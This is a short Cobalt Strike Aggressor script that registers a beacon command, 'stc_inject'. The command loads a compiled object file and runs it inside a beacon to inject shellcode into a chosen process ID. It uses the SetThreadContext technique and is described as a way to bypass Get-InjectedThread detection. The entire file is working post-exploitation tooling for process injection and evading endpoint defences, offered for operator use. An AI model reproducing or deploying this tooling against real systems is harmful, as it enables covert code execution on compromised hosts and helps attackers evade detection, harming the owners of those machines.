# $1 = beacon ID
# $2 = pid
# x86_64-w64-mingw32-gcc -c stc_inject.c -o stc_inject.o


alias stc_inject {
	local('$bid $handle $data $pid');

	# check our arguments
	if (size(@_) != 2) {
		berror($1, "stc_inject: not enough arguments. Enter the PID");
		return;
	}

	# parse our arguments
	$pid	= $2;

	# Verify PID is a number
	if ((!-isnumber $pid) || (int($pid) <= 0))
	{
		berror($1, "stc_inject: enter a valid PID");
		return;
	}

	# read in our BOF file...
	$handle = openf(script_resource("stc_inject.o"));
	$data	= readb($handle, -1);
	closef($handle);

	# pack our arguments
	$args	= bof_pack($1, "i", $pid);

	# announce to our user..
	btask($1, "Injecting into PID $2");

	# run a BOF
	beacon_inline_execute($1, $data, "go", $args);
}
beacon_command_register("stc_inject", "Basic PE shellcode injection method", "Synopsis: stc_inject [pid] \n\nBased on Adam Chester's method to bypass Get-InjectedThread\nThe SetThreadContext method.");

